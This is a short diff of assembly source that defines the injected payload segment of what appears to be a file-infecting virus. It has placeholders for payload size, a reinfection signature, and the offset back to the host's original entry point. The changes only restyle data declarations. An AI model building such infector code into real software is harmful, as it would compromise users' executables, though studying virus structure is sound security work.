@@ -6,14 +6,16 @@ PUBLIC to_c_code
 PUBLIC delta_start
 
 injected SEGMENT READ EXECUTE
+
 __payload_start:
 
     ; Will be replaced by the size of the payload
     code_size LABEL DWORD
-        dd 0
+        DWORD ?
 
+    ; Unique signature to identify the payload and avoid reinfection
     signature LABEL DWORD
-        dd 0BAADC0DEh
+        DWORD 0BAADC0DEh
 
     payload PROC
         ; int 3
@@ -36,11 +38,11 @@ __payload_start:
 
     ; Will be replaced by the offset to the C code
     to_c_code LABEL QWORD
-        dq 0
+        QWORD ?
 
     ; Will be replaced by the offset to the original entry point
     delta_start LABEL SQWORD
-        dq 0
+        SQWORD ?
 
 injected ENDS
 
